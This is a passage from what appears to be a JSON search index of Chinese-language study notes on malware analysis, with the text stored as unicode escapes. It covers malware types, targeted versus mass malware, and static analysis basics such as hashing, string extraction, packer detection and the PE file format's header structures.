\u901a\u5e38\u4f7f\u7528\u4e00\u4e9b\u975e\u4f20\u7edf\u7684\u6280\u672f\u6765\u542f\u52a8\u5176\u4ed6\u6076\u610f\u7a0b\u5e8f\uff0c\u4ee5\u786e\u4fdd\u5176\u9690\u853d\u6027\uff0c\u6216\u8005\u4ee5\u66f4\u9ad8\u6743\u9650\u8bbf\u95ee\u7cfb\u7edf\u3002 Rootkit\u5185\u6838\u5957\u4ef6 Malware that conceals the existence of other code Usually paired with a backdoor \u7528\u6765\u9690\u85cf\u5176\u4ed6\u6076\u610f\u4ee3\u7801\u7684\u6076\u610f\u4ee3\u7801 \u901a\u5e38\u662f\u4e0e\u5176\u4ed6\u6076\u610f\u4ee3\u7801\uff08\u5982\u540e\u95e8\uff09\u7ec4\u5408\u6210\u5de5\u5177\u5957\u88c5\uff0c\u6765\u5141\u8bb8\u4e3a\u653b\u51fb\u8005\u63d0\u4f9b\u8fdc\u7a0b\u8bbf\u95ee Scareware \u6050\u5413\u8f6f\u4ef6\uff08\u52d2\u7d22\u8f6f\u4ef6\uff1f\uff09 Frightens user into buying something \u52d2\u7d22\u7528\u6237\u8d2d\u4e70\u67d0\u4e9b\u4e1c\u897f\u7684\u6076\u610f\u4ee3\u7801 \u901a\u5e38\u6709\u4e00\u4e2a\u7528\u6237\u754c\u9762\uff0c\u4f7f\u5f97\u5b83\u770b\u8d77\u6765\u50cf\u662f\u4e00\u4e2a\u6740\u6bd2\u8f6f\u4ef6\u6216\u5176\u4ed6\u5b89\u5168\u7a0b\u5e8f\u3002\u5b83\u4f1a\u901a\u77e5\u7528\u6237\u7cfb\u7edf\u4e2d\u5b58\u5728\u6076\u610f\u4ee3\u7801\uff0c\u800c\u552f\u4e00\u9664\u6389\u5b83\u4eec\u7684\u65b9\u6cd5\u53ea\u6709\u8d2d\u4e70\u4ed6\u4eec\u7684\u201c\u8f6f\u4ef6\u201d\uff0c\u800c\u4e8b\u5b9e\u4e0a\uff0c\u4ed6\u4eec\u6240\u5356\u8f6f\u4ef6\u7684\u5168\u90e8\u529f\u80fd\u53ea\u4e0d\u8fc7\u662f\u5c06\u52d2\u7d22\u8f6f\u4ef6\u8fdb\u884c\u79fb\u9664\u800c\u5df1\u3002 Spam-sending malware \u53d1\u9001\u5783\u573e\u90ae\u4ef6\u7684\u6076\u610f\u4ee3\u7801 Attacker rents machine to spammers \u901a\u8fc7\u4e3a\u653b\u51fb\u8005\u51fa\u552e\u5783\u573e\u90ae\u4ef6\u53d1\u9001\u670d\u52a1\u800c\u83b7\u5f97\u6536\u76ca Worms or viruses \u8815\u866b\u6216\u75c5\u6bd2 Malicious code that can copy itself and infect additional computers \u53ef\u4ee5\u590d\u5236\u81ea\u8eab\u5e76\u611f\u67d3\u5176\u4ed6\u8ba1\u7b97\u673a\u7684\u6076\u610f\u4ee3\u7801 Ransomware \u52d2\u7d22\u8f6f\u4ef6 encrypt victim's data as hostage ask for ransom to recover the data \u5c06\u53d7\u5bb3\u8005\u7684\u6570\u636e\u52a0\u5bc6\u4e3a\u4eba\u8d28 \u52d2\u7d22\u8d22\u7269\u540e\u624d\u6062\u590d\u6570\u636e","title":"\u6076\u610f\u4ee3\u7801\u7684\u7c7b\u578b"},{"location":"MalwareAnalysis/knowledge/ch0/#mass-v-targeted-malware","text":"Mass malware \u5927\u4f17\u6027\u6076\u610f\u4ee3\u7801 Intended to infect as many machines as possible Most common type \u8bbe\u8ba1\u4e3a\u5f71\u54cd\u5230\u5c3d\u53ef\u80fd\u591a\u7684\u673a\u5668 \u6700\u4e3a\u666e\u904d","title":"Mass v. Targeted Malware"},{"location":"MalwareAnalysis/knowledge/ch0/#targeted-malware","text":"APT(Advanced Persistent Threat)\uff1a\u9ad8\u7ea7\u6301\u7eed\u6027\u5a01\u80c1\uff0c\u672c\u8d28\u662f\u9488\u5bf9\u6027\u653b\u51fb Tailored to a specific target Very difficult to detect, prevent, and remove Requires advanced analysis Ex: Stuxnet \u9488\u5bf9\u7279\u5b9a\u7ec4\u7ec7\u800c\u7814\u5236\u7684 \u5f88\u96be\u68c0\u6d4b\uff0c\u9632\u6b62\u548c\u79fb\u9664 \u9700\u8981\u9ad8\u7ea7\u5206\u6790 \u9707\u7f51\u75c5\u6bd2","title":"Targeted malware \u9488\u5bf9\u6027\u6076\u610f\u4ee3\u7801"},{"location":"MalwareAnalysis/knowledge/ch1/","text":"\u9759\u6001\u5206\u6790\u6280\u672f\u57fa\u7840 \u53cd\u75c5\u6bd2\u5f15\u64ce \u53ef\u4ee5\u7528\u4e00\u4e9b\u5f00\u6e90\u626b\u63cf\u5f15\u64ce\u5148\u626b\u4e00\u4e0b\u75c5\u6bd2 \u54c8\u5e0c\u503c \u6076\u610f\u4ee3\u7801\u7684\u552f\u4e00\u6807\u8bc6\u3002\u5982\u679c\u5bf9hash\u4e0d\u719f\u6089\uff0c\u8fd9\u91cc\u9700\u8981\u4e00\u4e9b\u5bc6\u7801\u5b66\u7684\u77e5\u8bc6\u3002 \u5de5\u5177\uff1a md5deep \u67e5\u627e\u5b57\u7b26\u4e32 \u5de5\u5177\uff1a strings strings\u4f1a\u5ffd\u7565\u4e0a\u4e0b\u6587\u548c\u683c\u5f0f\uff0c\u4ece\u6574\u4e2a\u6587\u4ef6\u4e2d\u68c0\u6d4b\u51fa\u53ef\u6253\u5370\u5b57\u7b26\u4e32\u3002 unicode\u7f16\u7801 \u8fd9\u91cc\u9700\u8981\u77e5\u9053unicode\u548cascii\u7684\u533a\u522b \u52a0\u58f3 \u52a0\u58f3\u7528\u6765\u9632\u6b62\u6076\u610f\u4ee3\u7801\u88ab\u8f7b\u6613\u5206\u6790\u51fa\u6765\u3002 \u52a0\u58f3\u548c\u6df7\u6dc6\u4ee3\u7801\u901a\u5e38\u5305\u542b LoadLibrary \u548c GetProcAddress \u51fd\u6570\uff0c\u7528\u6765\u52a0\u8f7d\u548c\u4f7f\u7528\u5176\u4ed6\u51fd\u6570\u529f\u80fd \u68c0\u6d4b \u5de5\u5177\uff1a PEiD 2011\u5e74\u505c\u6b62\u652f\u6301\uff0c\u4e0d\u77e5\u9053\u6709\u6ca1\u6709\u65b0\u7684\u5de5\u5177\u3002 PE\u6587\u4ef6\u683c\u5f0f \u672c\u6bb5\u5185\u5bb9\u7531\u7f51\u7edc\u77e5\u8bc6\u641c\u7d22\u800c\u6210\uff0c\u56e0\u4e3aPE\u6587\u4ef6\u975e\u5e38\u91cd\u8981\uff0c\u4e66\u4e0a\u8fd9\u4e00\u70b9\u8bb2\u5f97\u592a\u5c11\uff01 \u57fa\u672c\u4ecb\u7ecd PE\u6587\u4ef6\u662fWindows\u64cd\u4f5c\u7cfb\u7edf\u4e0b\u4f7f\u7528\u7684\u4e00\u79cd\u53ef\u6267\u884c\u6587\u4ef6\uff0c\u7531COFF\uff08UNIX\u5e73\u53f0\u4e0b\u7684\u901a\u7528\u5bf9\u8c61\u6587\u4ef6\u683c\u5f0f\uff09\u683c\u5f0f\u3002 PE\u662f\u201cPortable Executable File Format\u201d\uff08\u53ef\u79fb\u690d\u7684\u6267\u884c\u4f53\uff09\u7684\u7f29\u5199\u3002 PE\u6587\u4ef6\u662f\u6307 32 \u4f4d\u53ef\u6267\u884c\u6587\u4ef6\uff0c\u4e5f\u79f0\u4e3aPE32\u300264\u4f4d\u7684\u53ef\u6267\u884c\u6587\u4ef6\u79f0\u4e3a PE+ \u6216 PE32+\uff0c\u662fPE(PE32)\u7684\u4e00\u79cd\u6269\u5c55\u5f62\u5f0f\uff08\u8bf7\u6ce8\u610f\u4e0d\u662fPE64)\uff0c\u6ca1\u6709\u65b0\u7684\u7ed3\u6784\u52a0\u5165\uff0c\u53ea\u662f\u7b80\u5355\u5730\u5c06\u4ee5\u524d32\u4f4d\u5b57\u6bb5\u6269\u5c55\u621064\u4f4d\u3002\u5bf9\u4e8eC++\u4ee3\u7801\uff0cWindows\u6587\u4ef6\u5934\u7684\u914d\u7f6e\u4f7f\u5176\u62e5\u6709\u4e0d\u660e\u663e\u7684\u533a\u522b\u3002 \u4e8b\u5b9e\u4e0a\uff0c\u4e00\u4e2a\u6587\u4ef6\u662f\u5426\u662f PE \u6587\u4ef6\u4e0e\u5176\u6269\u5c55\u540d\u65e0\u5173\uff0cEXE\u6587\u4ef6\u548cDLL\u6587\u4ef6\u7684\u533a\u522b\u5b8c\u5168\u662f\u8bed\u4e49\u4e0a\u7684\u3002\u5b83\u4eec\u4f7f\u7528\u5b8c\u5168\u76f8\u540c\u7684PE\u683c\u5f0f\uff0c\u552f\u4e00\u7684\u533a\u522b\u5c31\u662f\u7528\u4e00\u4e2a\u5b57\u6bb5\u6807\u8bc6\u51fa\u8fd9\u4e2a\u6587\u4ef6\u662fEXE\u8fd8\u662fDLL\u3002 \u79cd\u7c7b \u79cd\u7c7b \u4e3b\u6269\u5c55\u540d \u53ef\u6267\u884c\u7cfb\u5217 EXE, SCR \u5e93\u7cfb\u5217 DLL, OCX, CPL, DRV \u9a71\u52a8\u7a0b\u5e8f\u7cfb\u5217 SYS, VXD \u5bf9\u8c61\u6587\u4ef6\u7cfb\u5217 OBJ ### \u57fa\u672c\u5f62\u5f0f PE\u6587\u4ef6\u4f7f\u7528\u7684\u662f\u4e00\u4e2a\u5e73\u9762\u5730\u5740\u7a7a\u95f4\uff0c\u6240\u6709\u4ee3\u7801\u548c\u6570\u636e\u90fd\u88ab\u5408\u5e76\u5728\u4e00\u8d77\uff0c\u7ec4\u6210\u4e00\u4e2a\u5f88\u5927\u7684\u7ed3\u6784\u3002\u6587\u4ef6\u7684\u5185\u5bb9\u88ab\u5206\u5272\u4e3a\u4e0d\u540c\u7684\u533a\u5757\uff08Section\uff0c\u53c8\u79f0\u533a\u6bb5\u3001\u8282\u7b49\uff09\uff0c\u533a\u5757\u4e2d\u5305\u542b\u4ee3\u7801\u6216\u6570\u636e\uff0c\u5404\u4e2a\u533a\u5757\u6309\u9875\u8fb9\u754c\u6765\u5bf9\u9f50\uff0c\u533a\u5757\u6ca1\u6709\u5927\u5c0f\u9650\u5236\uff0c\u662f\u4e00\u4e2a\u8fde\u7eed\u7ed3\u6784\u3002\u6bcf\u4e2a\u5757\u90fd\u6709\u5b83\u81ea\u5df1\u5728\u5185\u5b58\u4e2d\u7684\u4e00\u5957\u5c5e\u6027\uff0c\u6bd4\u5982\uff1a\u8fd9\u4e2a\u5757\u662f\u5426\u5305\u542b\u4ee3\u7801\u3001\u662f\u5426\u53ea\u8bfb\u6216\u53ef\u8bfb/\u5199\u7b49\u3002 ### \u5177\u4f53\u7ed3\u6784 1. DOS\u5934 \u662f\u7528\u6765\u517c\u5bb9 MS-DOS \u64cd\u4f5c\u7cfb\u7edf\u7684\uff0c\u76ee\u7684\u662f\u5f53\u8fd9\u4e2a\u6587\u4ef6\u5728 MS-DOS \u4e0a\u8fd0\u884c\u65f6\u63d0\u793a\u4e00\u6bb5\u6587\u5b57\uff0c\u5927\u90e8\u5206\u60c5\u51b5\u4e0b\u662f\uff1aThis program cannot be run in DOS mode. \u8fd8\u6709\u4e00\u4e2a\u76ee\u7684\uff0c\u5c31\u662f\u6307\u660e NT \u5934\u5728\u6587\u4ef6\u4e2d\u7684\u4f4d\u7f6e\u3002 2. NT\u5934 \u5305\u542b windows PE \u6587\u4ef6\u7684\u4e3b\u8981\u4fe1\u606f\uff0c\u5176\u4e2d\u5305\u62ec\u4e00\u4e2a 'PE' \u5b57\u6837\u7684\u7b7e\u540d\uff0cPE\u6587\u4ef6\u5934\uff08IMAGE_FILE_HEADER\uff09\u548c PE\u53ef\u9009\u5934\uff08IMAGE_OPTIONAL_HEADER32\uff09\u3002 3. \u8282\u8868\uff1a\u662f PE \u6587\u4ef6\u540e\u7eed\u8282\u7684\u63cf\u8ff0\uff0cwindows \u6839\u636e\u8282\u8868\u7684\u63cf\u8ff0\u52a0\u8f7d\u6bcf\u4e2a\u8282\u3002 4. \u8282\uff1a\u6bcf\u4e2a\u8282\u5b9e\u9645\u4e0a\u662f\u4e00\u4e2a\u5bb9\u5668\uff0c\u53ef\u4ee5\u5305\u542b \u4ee3\u7801\u3001\u6570\u636e \u7b49\u7b49\uff0c\u6bcf\u4e2a\u8282\u53ef\u4ee5\u6709\u72ec\u7acb\u7684\u5185\u5b58\u6743\u9650\uff0c\u6bd4\u5982\u4ee3\u7801\u8282\u9ed8\u8ba4\u6709\u8bfb/\u6267\u884c\u6743\u9650\uff0c\u8282\u7684\u540d\u5b57\u548c\u6570\u91cf\u53ef\u4ee5\u81ea\u5df1\u5b9a\u4e49\uff0c\u672a\u5fc5\u662f\u4e0a\u56fe\u4e2d\u7684\u4e09\u4e2a\u3002 RVA VA \u76f8\u5bf9\u865a\u62df\u5730\u5740RVA\u4e0e\u865a\u62df\u5730\u5740VA \u5f53\u4e00\u4e2a PE \u6587\u4ef6\u88ab\u52a0\u8f7d\u5230\u5185\u5b58\u4e2d\u4ee5\u540e\uff0c\u6211\u4eec\u79f0\u4e4b\u4e3a \" \u6620\u8c61 \"\uff08image\uff09\uff0c\u4e00\u822c\u6765\u8bf4\uff0cPE\u6587\u4ef6\u5728\u786c\u76d8\u4e0a\u548c\u5728\u5185\u5b58\u91cc\u662f\u4e0d\u5b8c\u5168\u4e00\u6837\u7684\uff0c\u88ab\u52a0\u8f7d\u5230\u5185\u5b58\u4ee5\u540e\u5176\u5360\u7528\u7684\u865a\u62df\u5730\u5740\u7a7a\u95f4\u8981\u6bd4\u5728\u786c\u76d8\u4e0a\u5360\u7528\u7684\u7a7a\u95f4\u5927\u4e00\u4e9b\uff0c\u8fd9\u662f\u56e0\u4e3a\u5404\u4e2a\u8282\u5728\u786c\u76d8\u4e0a\u662f\u8fde\u7eed\u7684\uff0c\u800c\u5728\u5185\u5b58\u4e2d\u662f\u6309\u9875\u5bf9\u9f50\u7684\uff0c\u6240\u4ee5\u52a0\u8f7d\u5230\u5185\u5b58\u4ee5\u540e\u8282\u4e4b\u95f4\u4f1a\u51fa\u73b0\u4e00\u4e9b \u201c\u7a7a\u6d1e\u201d \u3002 \u56e0\u4e3a\u5b58\u5728\u8fd9\u79cd\u5bf9\u9f50\uff0c\u6240\u4ee5\u5728 PE \u7ed3\u6784\u5185\u90e8\uff0c\u8868\u793a\u67d0\u4e2a\u4f4d\u7f6e\u7684\u5730\u5740\u91c7\u7528\u4e86\u4e24\u79cd\u65b9\u5f0f\uff1a \u9488\u5bf9\u5728\u786c\u76d8\u4e0a\u5b58\u50a8\u6587\u4ef6\u4e2d\u7684\u5730\u5740\uff0c\u79f0\u4e3a \u539f\u59cb\u5b58\u50a8\u5730\u5740 \u6216 \u7269\u7406\u5730\u5740\uff0c\u8868\u793a \u8ddd\u79bb\u6587\u4ef6\u5934\u7684\u504f\u79fb\u3002 \u9488\u5bf9\u52a0\u8f7d\u5230\u5185\u5b58\u4ee5\u540e\u6620\u8c61\u4e2d\u7684\u5730\u5740\uff0c\u79f0\u4e3a \u76f8\u5bf9\u865a\u62df\u5730\u5740\uff08RVA\uff09\uff0c\u8868\u793a\u76f8\u5bf9\u5185\u5b58\u6620\u8c61\u5934\u7684\u504f\u79fb\u3002 \u8fd9\u91cc\u9700\u8981\u77e5\u9053\u7684\u662fRVA=VA-ImageBase \u7ed3\u6784 DOS\u5934 \u7531MZ\u5934\u548cDOS\u5b58\u6839\u7ec4\u6210 MZ \u5934\u90e8\u662f\u771f\u6b63\u7684DOS\u5934\u90e8\uff0c\u7531\u4e8e\u5176\u5f00\u59cb\u5904\u7684\u4e24\u4e2a\u5b57\u8282\u4e3a\u201cMZ\u201d\uff0c\u56e0\u6b64DOS\u5934\u4e5f\u53ef\u4ee5\u53eb\u4f5cMZ\u5934\u3002\u8be5\u90e8\u5206\u7528\u4e8e\u7a0b\u5e8f\u5728DOS\u7cfb\u7edf\u4e0b\u52a0\u8f7d\uff0c\u5b83\u7684\u7ed3\u6784\u88ab\u5b9a\u4e49\u4e3aIMAGE_DOS_HEADER\u3002 \u5176\u4e2d\uff0c\u503c\u5f97\u6ce8\u610f\u7684\u662fe_magic\u5b57\u6bb5\u548ce_lfanew\u5b57\u6bb5 e_magic\u5b57\u6bb5\u5360\u4e24\u4e2a\u5b57\u8282\uff0c\u503c\u4e3a 0x5A4D \uff0c\u5bf9\u5e94ASCII\u7801\u503c\u4e3a 'MZ' \uff0c\"MZ\"\u5176\u5b9e\u662fMS-DOS\u7684\u521b\u5efa\u8005\u4e4b\u4e00Mark Zbikowski\u540d\u5b57\u7684\u7f29\u5199\u3002 e_lfanew\u5b57\u6bb5\u53604\u4e2a\u5b57\u8282\uff0c\u4f4d\u4e8e\u4ece\u6587\u4ef6\u5f00\u59cb\u504f\u79fb 3Ch \u5b57\u8282\u5904\uff0c\u7528\u4e8e\u6307\u51faNT\u5934\u7684\u504f\u79fb\u5730\u5740 typedef struct _IMAGE_DOS_HEADER { WORD e_magic; //\u9b54\u672f\u6570\u5b57 WORD e_cblp; //\u6587\u4ef6\u6700\u540e\u9875\u7684\u5b57\u8282\u6570 WORD e_cp; //\u6587\u4ef6\u9875\u6570 WORD e_crlc; //\u91cd\u5b9a\u4e49\u5143\u7d20\u4e2a\u6570 WORD e_cparhdr; //\u5934\u90e8\u5c3a\u5bf8\uff0c\u4ee5\u6bb5\u843d\u4e3a\u5355\u4f4d WORD e_minalloc; //\u6240\u9700\u7684\u6700\u5c0f\u9644\u52a0\u6bb5 WORD e_maxalloc; //\u6240\u9700\u7684\u6700\u5927\u9644\u52a0\u6bb5 WORD e_ss; //\u521d\u59cb\u7684SS\u503c\uff08\u76f8\u5bf9\u504f\u79fb\u91cf\uff09 WORD e_sp; //\u521d\u59cb\u7684SP\u503c WORD e_csum; //\u6821\u9a8c\u548c WORD e_ip; //\u521d\u59cb\u7684IP\u503c WORD e_cs; //\u521d\u59cb\u7684CS\u503c\uff08\u76f8\u5bf9\u504f\u79fb\u91cf\uff09 WORD e_lfarlc; //\u91cd\u5206\u914d\u8868\u6587\u4ef6\u5730\u5740 WORD e_ovno; //\u8986\u76d6\u53f7 WORD e_res[4]; //\u4fdd\u7559\u5b57 WORD e_oemid; //OEM\u6807\u8bc6\u7b26\uff08\u76f8\u5bf9e_oeminfo\uff09 WORD e_oeminfo; //OEM\u4fe1\u606f WORD e_res2[10]; //\u4fdd\u7559\u5b57 LONG e_lfanew; //\u65b0exe\u5934\u90e8\u7684\u6587\u4ef6\u4f4d\u7f6e } IMAGE_DOS_HEADER,*PIMAGE_DOS_HEADER; NT\u5934 PE\u6700\u91cd\u8981\u7684\u5934\uff0c\u7531 DOS \u5934\u4e2d\u7684 e_lfanew \u51b3\u5b9a \uff0c\u8868\u793a DOS\u5934\u4e4b\u540e\u7684 NT\u5934\u76f8\u5bf9\u6587\u4ef6\u8d77\u59cb\u5730\u5740\u7684\u504f\u79fb \u5de8\u6076\u5fc3\u7684\u4e00\u5927\u5768\u4e1c\u897f\u3002 \u8fd9\u4e00\u5757\u513f\u6700\u91cd\u8981\u7684\u662f\u5bfc\u5165\u8868\u3001\u5bfc\u51fa\u8868\u3001\u8d44\u6e90\u76ee\u5f55\u7b49\u3002 \u8fd9\u91cc\u65e5\u540e\u7528\u5230\u4e86\u518d\u5199\uff0c\u8fd9\u4e00\u5768\u662f\u771f\u7684\u6076\u5fc3 \u8282\u8868 \u8282\u8868Section Table\u662f\u4e00\u4e2a\u7ed3\u6784\u6570\u7ec4\uff0c\u6bcf\u4e2a\u5143\u7d20\u90fd\u662f\u4e00\u4e2aIMAGE_SECTION_HEADER\u7ed3\u6784\uff0c\u5305\u542b\u4e86\u5bf9\u5e94\u8282\u7684\u5c5e\u6027\u3001\u6587\u4ef6\u504f\u79fb\u91cf\u3001\u865a\u62df\u504f\u79fb\u91cf\u7b49\u3002 typedef struct _IMAGE_SECTION_HEADER { +000h BYTE Name[8]; //\u8282\u540d\u79f0\uff0c\u5982\".text\" union { +008h DWORD PhysicalAddress; // \u7269\u7406\u5730\u5740 +008h DWORD VirtualSize; // \u8282\u957f\u5ea6 } Misc; +00Ch DWORD VirtualAddress; // RVA +010h DWORD SizeOfRawData; // \u5bf9\u9f50\u540e\u7684\u8282\u5c3a\u5bf8 +014h DWORD PointerToRawData; // \u57fa\u4e8e\u6587\u4ef6\u7684\u504f\u79fb +018h DWORD PointerToRelocations; // \u91cd\u5b9a\u4f4d\u7684\u504f\u79fb +01Ch DWORD PointerToLinenumbers; // \u884c\u53f7\u8868\u7684\u504f\u79fb +020h WORD NumberOfRelocations; // \u91cd\u5b9a\u4f4d\u9879\u6570\u76ee +022h WORD NumberOfLinenumbers; // \u884c\u53f7\u8868\u4e2d\u884c\u53f7\u6570\u76ee +024h DWORD Characteristics; // \u8282\u5c5e\u6027 } IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER; PE \u6587\u4ef6\u7684\u6267\u884c\u987a\u5e8f \u5f53\u4e00\u4e2a PE \u6587\u4ef6 \u88ab\u6267\u884c\u65f6\uff0cPE \u88c5\u8f7d\u5668 \u9996\u5148\u68c0\u67e5 DOS header \u91cc\u7684 PE header \u7684\u504f\u79fb\u91cf\u3002\u5982\u679c\u627e\u5230\uff0c\u5219\u76f4\u63a5\u8df3\u8f6c\u5230 PE header \u7684\u4f4d\u7f6e\u3002 \u5f53 PE\u88c5\u8f7d\u5668 \u8df3\u8f6c\u5230 PE header \u540e\uff0c\u7b2c\u4e8c\u6b65\u8981\u505a\u7684\u5c31\u662f2. \u68c0\u67e5 PE header \u662f\u5426\u6709\u6548\u3002\u5982\u679c\u8be5 PE header \u6709\u6548\uff0c\u5c31\u8df3\u8f6c\u5230 PE header \u7684\u5c3e\u90e8\u3002 \u7d27\u8ddf PE header \u5c3e\u90e8\u7684\u662f\u8282\u8868\u3002PE\u88c5\u8f7d\u5668\u6267\u884c\u5b8c\u7b2c\u4e8c\u6b65\u540e\u5f00\u59cb\u8bfb\u53d6\u8282\u8868\u4e2d\u7684\u8282\u6bb5\u4fe1\u606f\uff0c\u5e76\u91c7\u7528\u6587\u4ef6\u6620\u5c04\uff08 \u5728\u6267\u884c\u4e00\u4e2aPE\u6587\u4ef6\u7684\u65f6\u5019\uff0cWindows\u5e76\u4e0d\u5728\u4e00\u5f00\u59cb\u5c31\u5c06\u6574\u4e2a\u6587\u4ef6\u8bfb\u5165\u5185\u5b58\uff0c\u800c\u662f\u91c7\u7528\u4e0e\u5185\u5b58\u6620\u5c04\u7684\u673a\u5236\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0cWindows\u88c5\u8f7d\u5668\u5728\u88c5\u8f7d\u7684\u65f6\u5019\u4ec5\u4ec5\u5efa\u7acb\u597d\u865a\u62df\u5730\u5740\u548cPE\u6587\u4ef6\u4e4b\u95f4\u7684\u6620\u5c04\u5173\u7cfb\uff0c\u53ea\u6709\u771f\u6b63\u6267\u884c\u5230\u67d0\u4e2a\u5185\u5b58\u9875\u4e2d\u7684\u6307\u4ee4\u6216\u8005\u8bbf\u95ee\u67d0\u4e00\u9875\u4e2d\u7684\u6570\u636e\u65f6\uff0c\u8fd9\u4e2a\u9875\u9762\u624d\u4f1a\u88ab\u4ece\u78c1\u76d8\u63d0\u4ea4\u5230\u7269\u7406\u5185\u5b58\uff0c\u8fd9\u79cd\u673a\u5236\u4f7f\u6587\u4ef6\u88c5\u5165\u7684\u901f\u5ea6\u548c\u6587\u4ef6\u5927\u5c0f\u6ca1\u6709\u592a\u5927\u7684\u5173\u7cfb \uff09\u7684\u65b9\u6cd5\u5c06\u8fd9\u4e9b\u8282\u6bb5\u6620\u5c04\u5230\u5185\u5b58\uff0c\u540c\u65f6\u9644\u4e0a\u8282\u8868\u91cc\u6307\u5b9a\u8282\u6bb5\u7684\u8bfb\u5199\u5c5e\u6027\u3002 PE\u6587\u4ef6\u6620\u5c04\u5165\u5185\u5b58\u540e\uff0cPE\u88c5\u8f7d\u5668\u5c06\u7ee7\u7eed\u5904\u7406PE\u6587\u4ef6\u4e2d\u7c7b\u4f3c import table \uff08\u8f93\u5165\u8868\uff09\u7684\u903b\u8f91\u90e8\u5206\u3002 ref \u535a\u5ba2 \u8fd9\u4e2a\u5f88\u7ec6\uff0c\u5efa\u8bae\u548c\u4e0a\u9762\u90a3\u4e2a\u7ed3\u5408\u770b \u8fd9\u4e2a\u5f88\u6e05\u695a\uff0c\u6709\u7b80\u8981\u7684\u8981\u70b9 Dependency Walker \u662f\u4e2a\u5de5\u5177\uff0c\u63a2\u7d22\u52a8\u6001\u94fe\u63a5\u51fd\u6570\u7684\u3002 \u5e38\u89c1\u7684DLL \u51fd\u6570\u547d\u540d\u7ea6\u5b9a Ex,\u662f\u5fae\u8f6f\u5728\u66f4\u65b0\u65b0\u51fd\u6570\u548c\u65e7\u51fd\u6570\u4e0d\u517c\u5bb9\u65f6\u52a0\u5165\u7684\u4e1c\u897f\u3002 \u800cA\u548cW\u7ed3\u5c3e\u662f\u6307\u63a5\u53d7\u53c2\u6570\u5206\u522b\u662fascii\u548cunicode \u5bfc\u5165\u5bfc\u51fa \u9700\u8981\u81ea\u5df1\u719f\u6089\u4e00\u4e9bwindows\u51fd\u6570 PEview \u5de5\u5177\uff0c\u67e5\u770bPE\u6587\u4ef6\u683c\u5f0f\u7684 Resource Hacker \u5de5\u5177\uff0c\u67e5\u770b\u8d44\u6e90\u8282 \u5176\u4ed6\u5de5\u5177 PEBrowse Professional PE Explorer","title":"ch1"},{"location":"MalwareAnalysis/knowledge/ch1/#_1","text":"","title":"\u9759\u6001\u5206\u6790\u6280\u672f\u57fa\u7840"},{"location":"MalwareAnalysis/knowledge/ch1/#_2","text":"\u53ef\u4ee5\u7528\u4e00\u4e9b\u5f00\u6e90\u626b\u63cf\u5f15\u64ce\u5148\u626b\u4e00\u4e0b\u75c5\u6bd2","title":"\u53cd\u75c5\u6bd2\u5f15\u64ce"},{"location":"MalwareAnalysis/knowledge/ch1/#_3","text":"\u6076\u610f\u4ee3\u7801\u7684\u552f\u4e00\u6807\u8bc6\u3002\u5982\u679c\u5bf9hash\u4e0d\u719f\u6089\uff0c\u8fd9\u91cc\u9700\u8981\u4e00\u4e9b\u5bc6\u7801\u5b66\u7684\u77e5\u8bc6\u3002 \u5de5\u5177\uff1a md5deep","title":"\u54c8\u5e0c\u503c"},{"location":"MalwareAnalysis/knowledge/ch1/#_4","text":"\u5de5\u5177\uff1a strings strings\u4f1a\u5ffd\u7565\u4e0a\u4e0b\u6587\u548c\u683c\u5f0f\uff0c\u4ece\u6574\u4e2a\u6587\u4ef6\u4e2d\u68c0\u6d4b\u51fa\u53ef\u6253\u5370\u5b57\u7b26\u4e32\u3002","title":"\u67e5\u627e\u5b57\u7b26\u4e32"},{"location":"MalwareAnalysis/knowledge/ch1/#unicode","text":"\u8fd9\u91cc\u9700\u8981\u77e5\u9053unicode\u548cascii\u7684\u533a\u522b","title":"unicode\u7f16\u7801"},{"location":"MalwareAnalysis/knowledge/ch1/#_5","text":"\u52a0\u58f3\u7528\u6765\u9632\u6b62\u6076\u610f\u4ee3\u7801\u88ab\u8f7b\u6613\u5206\u6790\u51fa\u6765\u3002 \u52a0\u58f3\u548c\u6df7\u6dc6\u4ee3\u7801\u901a\u5e38\u5305\u542b LoadLibrary \u548c GetProcAddress \u51fd\u6570\uff0c\u7528\u6765\u52a0\u8f7d\u548c\u4f7f\u7528\u5176\u4ed6\u51fd\u6570\u529f\u80fd","title":"\u52a0\u58f3"},{"location":"MalwareAnalysis/knowledge/ch1/#_6","text":"\u5de5\u5177\uff1a PEiD 2011\u5e74\u505c\u6b62\u652f\u6301\uff0c\u4e0d\u77e5\u9053\u6709\u6ca1\u6709\u65b0\u7684\u5de5\u5177\u3002","title":"\u68c0\u6d4b"},{"location":"MalwareAnalysis/knowledge/ch1/#pe","text":"\u672c\u6bb5\u5185\u5bb9\u7531\u7f51\u7edc\u77e5\u8bc6\u641c\u7d22\u800c\u6210\uff0c\u56e0\u4e3aPE\u6587\u4ef6\u975e\u5e38\u91cd\u8981\uff0c\u4e66\u4e0a\u8fd9\u4e00\u70b9\u8bb2\u5f97\u592a\u5c11\uff01","title":"PE\u6587\u4ef6\u683c\u5f0f"},{"location":"MalwareAnalysis/knowledge/ch1/#_7","text":"PE\u6587\u4ef6\u662fWindows\u64cd\u4f5c\u7cfb\u7edf\u4e0b\u4f7f\u7528\u7684\u4e00\u79cd\u53ef\u6267\u884c\u6587\u4ef6\uff0c\u7531COFF\uff08UNIX\u5e73\u53f0\u4e0b\u7684\u901a\u7528\u5bf9\u8c61\u6587\u4ef6\u683c\u5f0f\uff09\u683c\u5f0f\u3002 PE\u662f\u201cPortable Executable File Format\u201d\uff08\u53ef\u79fb\u690d\u7684\u6267\u884c\u4f53\uff09\u7684\u7f29\u5199\u3002 PE\u6587\u4ef6\u662f\u6307 32 \u4f4d\u53ef\u6267\u884c\u6587\u4ef6\uff0c\u4e5f\u79f0\u4e3aPE32\u300264\u4f4d\u7684\u53ef\u6267\u884c\u6587\u4ef6\u79f0\u4e3a PE+ \u6216 PE32+\uff0c\u662fPE(PE32)\u7684\u4e00\u79cd\u6269\u5c55\u5f62\u5f0f\uff08\u8bf7\u6ce8\u610f\u4e0d\u662fPE64)\uff0c\u6ca1\u6709\u65b0\u7684\u7ed3\u6784\u52a0\u5165\uff0c\u53ea\u662f\u7b80\u5355\u5730\u5c06\u4ee5\u524d32\u4f4d\u5b57\u6bb5\u6269\u5c55\u621064\u4f4d\u3002\u5bf9\u4e8eC++\u4ee3\u7801\uff0cWindows\u6587\u4ef6\u5934\u7684\u914d\u7f6e\u4f7f\u5176\u62e5\u6709\u4e0d\u660e\u663e\u7684\u533a\u522b\u3002 